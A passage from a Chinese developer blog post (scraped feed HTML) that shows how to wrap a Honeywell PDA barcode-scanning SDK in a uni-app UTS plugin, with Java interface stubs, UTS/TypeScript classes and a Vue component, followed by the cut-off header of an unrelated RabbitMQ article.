<li>第二，不是谁谁来设置这些PDA手持设备，都没有办法保证每一台PDA都一定设置正确。</li>
</ul>
<p>这个是无法接受的缺点，所以最终也没有采用该方案。</p>
<h3 data-id="heading-11">PDA厂商SDK方案</h3>
<p>红外扫码作为PDA的原生能力，那么自然会对有需求的开发者提供相关的SDK。我们只需要调用这些SDK，就可以轻松完成红外扫码识别。</p>
<p>步骤拆解：</p>
<ol>
<li>接入PDA手持设备的官方SDK。</li>
<li>在插件中完成，对红外扫码的监听。</li>
<li>封装相关业务组件，提供给项目使用。</li>
</ol>
<hr/>
<h2 data-id="heading-12">具体实现</h2>
<p>当前实现过程使用的是霍尼韦尔PDA设备，接下来的实现过程将以该品牌提供的SDK作为例子。大家在自己开发、接入SDK时，需要向适配的PDA厂商索要红外扫码SDK的相关文档、示例。</p>
<h3 data-id="heading-13">如何获取SDK</h3>
<p>获取sdk有多种途径，这个同学们可以询问一下公司的采购，或者向上级反映情况。</p>
<ul>
<li>可以去各个品牌的官网下载。</li>
<li>找购买渠道的渠道商要相关型号品牌的sdk。</li>
</ul>
<h3 data-id="heading-14">了解SDK</h3>
<p>大致有两个比较重要类需要我们在编写代码前了解一下：</p>
<ul>
<li><code>AidcManager</code>这个是扫码模块的管理类。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 红外扫码模块的管理类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AidcManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.lang.Object {

    <span class="hljs-comment">/**
     * 这个接口提供了AidcManager创建成功的回调方法。
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AidcManager</span>.CreatedCallback {
    
        <span class="hljs-comment">/**
         * 需要我们未来实现的方法，实现红外扫码功能。
         * aidcManager是红外扫码管理实例
         */</span>
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreated</span><span class="hljs-params">(AidcManager aidcManager)</span>
    }

    <span class="hljs-comment">/* 
     * 创建红外扫码管理器的静态类，需用通过该方法创建AidcManager的实例。
     * context 是安卓引用的上下文对象
     * callback 将在这个类里面实现红外扫码的基本功能。
     *
     * 我们不关心其内部实现
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">(Context context, AidcManager.CreatedCallback callback)</span>
    
    <span class="hljs-comment">/**
     * 用于创建红外扫码读取器对象
     * 不需要关心其内部实现。
     */</span>
    <span class="hljs-keyword">public</span> BarcodeReader <span class="hljs-title function_">createBarcodeReader</span><span class="hljs-params">()</span>
    
    <span class="hljs-comment">// 关闭红外扫码服务的连接。</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>

}
</code></pre>
<ul>
<li><code>BarcodeReader</code>这个是红外扫码的读取器类。</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 红外扫码的读取器类</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BarcodeReader</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.lang.Object {

    <span class="hljs-comment">/**
     * 红外扫码事件的接口，包含红外扫码事件的回调事件
     * 红外扫码的成功响应回调方法
     * 红外扫码的失败响应回调方法
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BarcodeReader</span>.BarcodeListener <span class="hljs-keyword">extends</span> <span class="hljs-title class_">java</span>.util.EventListener {
    
        <span class="hljs-comment">// 红外扫码的成功响应回调方法</span>
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onBarcodeEvent</span><span class="hljs-params">(BarcodeReadEvent event)</span>
        
        <span class="hljs-comment">// 红外扫码的失败响应回调方法</span>
        <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFailureEvent</span><span class="hljs-params">(BarcodeFailureEvent event)</span>
    }
    
    <span class="hljs-comment">// 红外扫码读取器 绑定响应事件回调</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addBarcodeListener</span><span class="hljs-params">(BarcodeReader.BarcodeListener listener)</span>
    
    <span class="hljs-comment">// 红外扫码读取器 移除响应事件回调</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeBarcodeListener</span><span class="hljs-params">(BarcodeReader.BarcodeListener listener)</span>
    
    <span class="hljs-comment">//  红外扫码读取器 开始响应扫码结果的事件</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">claim</span><span class="hljs-params">()</span>
    
    <span class="hljs-comment">// 红外扫码读取器 停止响应扫码结果的事件</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">()</span>
    
    <span class="hljs-comment">// 销毁红外扫码读取器</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">close</span><span class="hljs-params">()</span>
}
</code></pre>
<h3 data-id="heading-15">创建uts插件</h3>
<p>创建<code>uts插件</code>有两种方法：</p>
<ul>
<li>第一种，是手动创建<code>uts插件</code>的目录结构（不建议，容易有遗漏）。</li>
<li>第二种如下图，依赖<code>HBuilderX</code>。右键<code>uni_modules</code>文件夹，点击新建<code>uni_modules插件</code>。选择第三项<code>uts插件-api插件</code>。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/254f46d3187d487481f220bc77269c03~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IO95LiN6IO96YCB5oiR5LiA5py15bCP57qi6Iqx:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765446550&amp;x-signature=NF24urWMbMeVYZ0gWASZIfVB6HE%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">uts插件目录</h3>
<p>PDA厂商提供的sdk放置在<code>utssdk/app-android/libs</code>文件夹下就可以，<code>uts插件</code>支持以下三种类型文件：</p>
<ul>
<li><code>jar</code></li>
<li><code>aar</code></li>
<li><code>so库</code></li>
</ul>
<p>大致的目录结构如下</p>
<pre><code class="hljs language-csharp" lang="csharp">├─<span class="hljs-keyword">static</span>                          <span class="hljs-comment">// 静态资源</span>
├─utssdk                          <span class="hljs-comment">// 插件主要功能的代码目录</span>
│        ├─app-android                 <span class="hljs-comment">//Android平台目录</span>
│        │        ├─assets                  <span class="hljs-comment">//Android原生assets资源目录，可选</span>
│        │        ├─libs                    <span class="hljs-comment">//Android原生库目录，可选</span>
│        │        ├─res                     <span class="hljs-comment">//Android原生res资源目录，可选</span>
│        │        └─index.uts               <span class="hljs-comment">//需要我们实现的插件功能入口，必须</span>
│        ├─app-ios                     <span class="hljs-comment">//iOS平台目录 不在本文的讨论范围内。</span>
│        ├─<span class="hljs-keyword">interface</span>.uts               <span class="hljs-comment">// 声明插件对外暴露的API，必需</span>
│        └─unierror.uts                <span class="hljs-comment">// 定义插件对外暴露的错误信息，可选</span>
├─changelog.md                   <span class="hljs-comment">// 说明文件</span>
├─readme.md                      <span class="hljs-comment">// 说明文件</span>
└─package.json                    <span class="hljs-comment">// 插件清单文件，必需</span>
</code></pre>
<h3 data-id="heading-17">实现uts插件</h3>
<p>在<code>utssdk/app-android/</code>目录下新建<code>barcode.uts</code>文件，用于实现红外扫码的<code>AidcManager.CreatedCallback</code>接口，完成以下功能：</p>
<ul>
<li>完成<code>aidcManager</code>实例的绑定。</li>
<li>创建红外扫码读取器实例。</li>
<li>给<code>红外扫码读取器实例</code>绑定响应事件。</li>
<li>开启<code>红外扫码读取器实例</code>对红外扫码结果的响应</li>
<li>销毁红外扫扫码管理实例、读取器实例</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BarcodeManager</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">CreatedCallback</span> {
  <span class="hljs-comment">/** 扫码模块的管理实例 */</span>
  <span class="hljs-attr">manager</span>: <span class="hljs-title class_">AidcManager</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
  <span class="hljs-comment">/** 扫码的读取器实例 */</span>
  <span class="hljs-attr">reader</span>: <span class="hljs-title class_">BarcodeReader</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>
  <span class="hljs-comment">/** 扫码的监听器实例 */</span>
  <span class="hljs-attr">listener</span>: <span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">BarcodeListener</span> | <span class="hljs-literal">null</span>

  <span class="hljs-comment">// 绑定红外扫码读取器的监听器实例</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">listener: BarcodeReader.BarcodeListener</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span> = listener
  }

  <span class="hljs-comment">/** 扫码模块的初始化完成后，绑定红外扫码监听事件， */</span>
  <span class="hljs-keyword">override</span> <span class="hljs-title function_">onCreated</span>(<span class="hljs-params">aidcManager: AidcManager</span>) {
  
    <span class="hljs-comment">// 绑定红外扫码模块实例</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span> = aidcManager

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span> !== <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 创建读取器</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span>?.<span class="hljs-title function_">createBarcodeReader</span>()

      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span> !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">try</span> {
          <span class="hljs-comment">// 扫码读取器的一些配置</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_CODE_128_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_GS1_128_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_QR_CODE_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_CODE_39_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_DATAMATRIX_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_UPC_A_ENABLE</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_EAN_13_ENABLED</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_AZTEC_ENABLED</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_CODABAR_ENABLED</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_INTERLEAVED_25_ENABLED</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_PDF_417_ENABLED</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_CODE_39_MAXIMUM_LENGTH</span>, <span class="hljs-number">10</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_CENTER_DECODE</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_NOTIFICATION_BAD_READ_ENABLED</span>, <span class="hljs-literal">true</span>)

          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_INTERLEAVED_25_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_INTERLEAVED_25_REDUNDANCY_MODE</span>, <span class="hljs-number">10</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_LINEAR_VOID_HANDLING</span>, <span class="hljs-literal">false</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_DATA_PROCESSOR_LAUNCH_BROWSER</span>, <span class="hljs-literal">false</span>)

          <span class="hljs-comment">// ocr设置</span>
          <span class="hljs-keyword">const</span> <span class="hljs-attr">comreg</span>: <span class="hljs-built_in">string</span> =
            <span class="hljs-string">'[{"enabled":true,"key":"chanum","regexValue":"[A-Z a-z]{2}\\d{3}","type":"CUSTOMIZED"},'</span> +
            <span class="hljs-string">'{"enabled":true,"key":"OCR_CONTENT_REGEX_IP_ADDRESS","type":"EMBEDDED"}]'</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_OCR_ENABLED</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_OCR_EXCLUSIVE</span>, <span class="hljs-literal">true</span>)
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(<span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_OCR_CONTENT_REGEX_SEQUENCE</span>, comreg)

          <span class="hljs-comment">// 按键触发模式</span>
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">setProperty</span>(
            <span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">PROPERTY_TRIGGER_CONTROL_MODE</span>,
            <span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">TRIGGER_CONTROL_MODE_AUTO_CONTROL</span>
          )
        } <span class="hljs-keyword">catch</span> (e) {
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>}</span> Failed to apply properties`</span>)
        }

        <span class="hljs-comment">// 注册响应事件</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">addBarcodeListener</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span>)
        <span class="hljs-comment">// 读取器开启红外扫码结果响应</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">claim</span>();
      }
    }
  }

  <span class="hljs-comment">// 提供红外扫码管理模块的注销方法</span>
  <span class="hljs-title function_">destroyManager</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 注销读取器实例</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span> != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 停止读取器的响应</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">release</span>();
      <span class="hljs-comment">// 注销监听事件</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">removeBarcodeListener</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span>)
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">listener</span> = <span class="hljs-literal">null</span>

      <span class="hljs-comment">// 关闭扫码读取器</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span>?.<span class="hljs-title function_">close</span>()
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">reader</span> = <span class="hljs-literal">null</span>
    }
    
    <span class="hljs-comment">// 注销红外扫码管理模块</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span> != <span class="hljs-literal">null</span>) {
      <span class="hljs-comment">// 关闭红外扫码模块连接</span>
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span>?.<span class="hljs-title function_">close</span>()
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">manager</span> = <span class="hljs-literal">null</span>
    }
  }
}
</code></pre>
<p>在<code>utssdk/app-android/</code>目录下新建<code>listener.uts</code>文件，实现<code>BarcodeReader.BarcodeListener</code>接口，给读取器实例绑定不同的响应事件。</p>
<pre><code class="hljs language-typescript" lang="typescript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Listener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BarcodeReader</span>.<span class="hljs-property">BarcodeListener</span> {
  <span class="hljs-attr">onScanBarcode</span>: <span class="hljs-function">(<span class="hljs-params">barcode: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">onScanFail</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>

  <span class="hljs-comment">// 绑定外部的红外扫码结果响应事件</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">onScanBarcode: (barcode: <span class="hljs-built_in">string</span>) =&gt; <span class="hljs-built_in">void</span>, onScanFail: () =&gt; <span class="hljs-built_in">void</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onScanBarcode</span> = onScanBarcode
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">onScanFail</span> = onScanFail
  }

  <span class="hljs-comment">// 扫码成功回调事件方法</span>
  <span class="hljs-keyword">override</span> <span class="hljs-title function_">onBarcodeEvent</span>(<span class="hljs-params">event: BarcodeReadEvent</span>) {
    <span class="hljs-keyword">const</span> barcode = event.<span class="hljs-title function_">getBarcodeData</span>()
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onScanBarcode</span>(barcode)
  }

  <span class="hljs-comment">// 扫码失败的回调事件方法</span>
  <span class="hljs-keyword">override</span> <span class="hljs-title function_">onFailureEvent</span>(<span class="hljs-params">event: BarcodeFailureEvent</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">onScanFail</span>()
  }
}
</code></pre>
<p>最后实现入口文件<code>index.uts</code>，这个文件给<code>uniapp</code>组件、页面提供了可调用的方法：</p>
<ul>
<li><code>initSilenceScan</code>：用于初始化红外扫码对象</li>
<li><code>destroySilenceScan</code>：用于销毁红外扫码对象，释放内存</li>
</ul>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 扫码模块实例</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">barcodeManager</span>: <span class="hljs-title class_">BarcodeManager</span> | <span class="hljs-literal">null</span> = <span class="hljs-literal">null</span>

<span class="hljs-comment">// 初始化红外扫码相关功能</span>
<span class="hljs-meta">@UTSJS</span>.<span class="hljs-property">keepAlive</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">initSilenceScan</span> ({ onScanBarcode, onScanFail }: <span class="hljs-title class_">InitSilenceScanOpt</span>) {
  <span class="hljs-comment">// 判断红外扫码模块是否存在，如果存在则不重复创建。</span>
  <span class="hljs-keyword">if</span> (barcodeManager?.<span class="hljs-property">manager</span> == <span class="hljs-literal">null</span>) {
  
    <span class="hljs-comment">// 创建红外扫码响应事件实例</span>
    <span class="hljs-keyword">const</span> listener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Listener</span>(onScanBarcode, onScanFail)
    
    <span class="hljs-comment">// 创建红外扫码功能模块</span>
    <span class="hljs-keyword">const</span> barcodeManager = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BarcodeManager</span>(listener)
    
    <span class="hljs-comment">// 获取安卓app的上下文对象</span>
    <span class="hljs-keyword">const</span> context = <span class="hljs-title class_">UTSAndroid</span>.<span class="hljs-title function_">getAppContext</span>()
    
    <span class="hljs-comment">// 调用AidcManager.create抽象方法，创建红外扫码管理实例</span>
    <span class="hljs-title class_">AidcManager</span>.<span class="hljs-title function_">create</span>(context, barcodeManager)
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">destroySilenceScan</span>(<span class="hljs-params"/>) {

  <span class="hljs-comment">// 销毁红外扫码模块</span>
  barcodeManager?.<span class="hljs-title function_">destroyManager</span>()
}
</code></pre>
<p>封装红外扫码业务组件<code>SilenceScan</code>。后续需要使用红外扫码的页面组件，只需要引入<code>SilenceScan</code>组件，即可丝滑享受红外扫码功能。</p>
<pre><code class="hljs language-typescript" lang="typescript">&lt;script setup lang=<span class="hljs-string">"ts"</span>&gt;
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">SilenceScan</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/uni_modules/silence-scan'</span>
<span class="hljs-keyword">import</span> { onHide, onShow } <span class="hljs-keyword">from</span> <span class="hljs-string">'@dcloudio/uni-app'</span>
<span class="hljs-keyword">import</span> { onBeforeMount, onBeforeUnmount, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">/** 对外抛出的ScanCode事件 */</span>
<span class="hljs-keyword">const</span> emit = defineEmits&lt;{ <span class="hljs-attr">scanCode</span>: [<span class="hljs-attr">code</span>: <span class="hljs-built_in">string</span>] }&gt;()

<span class="hljs-comment">/** 扫码成功事件 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">onSilenceScanCode</span> = (<span class="hljs-params">code: <span class="hljs-built_in">string</span></span>) =&gt; {
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'scanCode'</span>, code)
}

<span class="hljs-comment">/** 扫码失败事件 */</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">onScanFail</span> = (<span class="hljs-params"/>) =&gt; {
  uni.<span class="hljs-title function_">showToast</span>({ <span class="hljs-attr">icon</span>: <span class="hljs-string">'none'</span>, <span class="hljs-attr">title</span>: <span class="hljs-string">'请检查扫描的条码、二维码'</span> })
}

<span class="hljs-comment">// 组件所在页面显示，初始化扫码对象</span>
<span class="hljs-title function_">onShow</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title class_">SilenceScan</span>.<span class="hljs-title function_">initSilenceScan</span>({ <span class="hljs-attr">onScanBarcode</span>: onSilenceScanCode, onScanFail })
})

<span class="hljs-comment">// 当前组件所在页面隐藏，销毁扫码。</span>
<span class="hljs-title function_">onHide</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title class_">SilenceScan</span>.<span class="hljs-title function_">destroySilenceScan</span>()
})

<span class="hljs-comment">// 当前组件销毁，销毁扫码对象</span>
<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-title class_">SilenceScan</span>.<span class="hljs-title function_">destroySilenceScan</span>()
})
&lt;/script&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">view</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span></span>

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span>
</code></pre>
<h2 data-id="heading-18">最后</h2>
<p>文中如有错误或不严谨的地方，请给予指正，十分感谢。</p>
<h2 data-id="heading-19">代码地址</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzwh0216%2Funiapp-silence-scan" target="_blank" title="https://github.com/zwh0216/uniapp-silence-scan" ref="nofollow noopener noreferrer">红外扫码uts插件 github</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[高并发分布式Springcloud系统下，使用RabbitMQ实现订单支付完整闭环的实现方案（反向撤销+重试+补偿）]]></title>    <link>https://juejin.cn/post/7579819594270965798</link>    <guid>https://juejin.cn/post/7579819594270965798</guid>    <pubDate>2025-12-04T09:31:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594270965798" data-draft-id="7579814711853121546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="高并发分布式Springcloud系统下，使用RabbitMQ实现订单支付完整闭环的实现方案（反向撤销+重试+补偿）"/> <meta itemprop="keywords" content="分布式,Spring Cloud,RabbitMQ"/> <meta itemprop="datePublished" content="2025-12-04T09:31:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="哈哈哈笑什么"/> <meta itemprop="url" content="https://juejin.cn/user/808832912075352"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            高并发分布式Springcloud系统下，使用RabbitMQ实现订单支付完整闭环的实现方案（反向撤销+重试+补偿）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/808832912075352/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    哈哈哈笑什么
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:31:31.000Z" title="Thu Dec 04 2025 09:31:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
